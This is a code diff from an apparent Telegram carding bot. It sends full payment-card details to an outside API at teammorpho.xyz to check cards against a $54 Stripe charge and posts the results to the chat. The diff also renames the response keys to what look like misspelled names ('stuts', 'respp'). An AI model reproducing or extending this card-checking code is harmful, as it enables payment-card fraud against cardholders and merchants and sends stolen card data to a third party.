@@ -149,11 +149,11 @@ Retry After {after}s
                                 f"https://teammorpho.xyz/api/str76.php?lista={fullcc}"
                             )
                             reqone = session.get(authurl)
-                            data = json.loads(reqone)
-                            stat = data["status"]
-                            ress = data["resp"]
+                            data = reqone.json()
+                            stat = data["stuts"]
+                            ress = data["respp"]
                             fourthresp = f"""
-<b> SHOPIFY+STRIPE $54
+<b> STRIPE $54
 ━━━━━━━━━
  Card - <code>{fullcc}</code> 
  Status - Processing...
@@ -219,7 +219,7 @@ Retry After {after}s
                                 message.chat.id, fourthchk.id, fifthresp
                             )
                             sixresp = f"""
-<b> SHOPIFY+STRIPE $54
+<b> STRIPE $54
 ━━━━━━━━━
  Card - <code>{fullcc}</code> 
  Status - Processing...
